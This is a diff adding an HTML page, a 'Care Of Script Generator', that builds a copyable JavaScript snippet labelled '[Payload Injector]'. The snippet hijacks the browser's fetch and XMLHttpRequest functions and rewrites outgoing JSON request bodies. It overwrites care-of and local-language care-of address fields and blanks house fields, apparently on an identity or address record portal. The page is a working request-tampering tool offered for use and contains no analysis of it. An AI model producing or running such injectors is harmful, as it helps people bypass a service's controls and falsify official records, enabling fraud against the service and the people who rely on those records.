@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Care Of Script Generator</title>
+
+<style>
+body{
+    font-family:Arial,sans-serif;
+    background:#0f172a;
+    color:white;
+    padding:20px;
+}
+
+.container{
+    max-width:900px;
+    margin:auto;
+    background:#1e293b;
+    padding:20px;
+    border-radius:12px;
+}
+
+input,select{
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    border:none;
+    border-radius:8px;
+}
+
+button{
+    background:#00c853;
+    color:white;
+    border:none;
+    padding:12px 20px;
+    margin-top:15px;
+    cursor:pointer;
+    border-radius:8px;
+}
+
+button:hover{
+    background:#00a844;
+}
+
+textarea{
+    width:100%;
+    height:400px;
+    margin-top:15px;
+    background:black;
+    color:#00ff00;
+    border:none;
+    padding:10px;
+    border-radius:8px;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<h2>Care Of Script Generator</h2>
+
+<select id="relation">
+    <option value="C/O">C/O Father Name</option>
+    <option value="S/0">S/O Father Name</option>
+    <option value="D/O">D/O Father Name</option>
+    <option value="W/O">W/O Husband Name</option>
+    
+</select>
+
+<input type="text" id="englishName" placeholder="English Name">
+
+<input type="text" id="hindiName" placeholder="Hindi Name">
+
+<button onclick="generateCode()">Generate Script</button>
+
+<button onclick="copyCode()">Copy Code</button>
+
+<textarea id="output"></textarea>
+
+</div>
+
+<script>
+
+function generateCode(){
+
+let relation=document.getElementById("relation").value;
+let eng=document.getElementById("englishName").value.trim();
+let hindi=document.getElementById("hindiName").value.trim();
+
+let engVal=relation+" "+eng;
+let hindiVal=relation+" "+hindi;
+
+let code=`(function() {
+
+    const ENG_VAL = "${engVal}";
+    const HINDI_VAL = "${hindiVal}";
+
+    console.log("%c[Payload Injector] Status: Active (Targeting CareOf)", "color: #00ffff; font-weight: bold;");
+
+    function fixPayload(obj) {
+        if (typeof obj !== 'object' || obj === null) return;
+
+        if (obj.address && typeof obj.address === 'object') {
+
+            obj.address.careOf = ENG_VAL;
+            obj.address.co = ENG_VAL;
+
+            obj.address.localLanguageCareOf = HINDI_VAL;
+            obj.address.localLanguageCo = HINDI_VAL;
+
+            obj.address.house = null;
+            obj.address.localLanguageHouse = null;
+        }
+        
+        //2. Global Backup (Agar keys direct object mein ho)
+
+        const mapping = {
+            careOf: ENG_VAL,
+            co: ENG_VAL,
+            localLanguageCareOf: HINDI_VAL,
+            localLanguageCo: HINDI_VAL
+        };
+
+        for (let key in mapping) {
+            if (obj.hasOwnProperty(key)) {
+                obj[key] = mapping[key];
+            }
+        }
+        
+        //3. Nested Data Search (Recursion)
+
+        for (let key in obj) {
+            if (
+                obj.hasOwnProperty(key) &&
+                typeof obj[key] === 'object' &&
+                obj[key] !== null
+            ) {
+                fixPayload(obj[key]);
+            }
+        }
+    }
+    
+    //--- Network Interception (Fetch & XHR) ---
+
+    const originalFetch = window.fetch;
+
+    window.fetch = async (...args) => {
+
+        if (args[1] && args[1].body) {
+
+            try {
+
+                let data = JSON.parse(args[1].body);
+
+                fixPayload(data);
+
+                args[1].body = JSON.stringify(data);
+
+            } catch (e) {}
+
+        }
+
+        return originalFetch(...args);
+
+    };
+
+    const originalSend = XMLHttpRequest.prototype.send;
+
+    XMLHttpRequest.prototype.send = function(body) {
+
+        if (body && typeof body === "string") {
+
+            try {
+
+                let data = JSON.parse(body);
+
+                fixPayload(data);
+
+                arguments[0] = JSON.stringify(data);
+
+            } catch (e) {}
+
+        }
+
+        return originalSend.apply(this, arguments);
+
+    };
+
+    alert("Script Updated Successfully!");
+
+})();`;
+
+document.getElementById("output").value=code;
+
+}
+
+function copyCode(){
+
+let text=document.getElementById("output");
+
+text.select();
+
+document.execCommand("copy");
+
+alert("Code Copied Successfully");
+
+}
+
+</script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"8a1776c031d64e8f8fcb1f57fd3e30ee","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
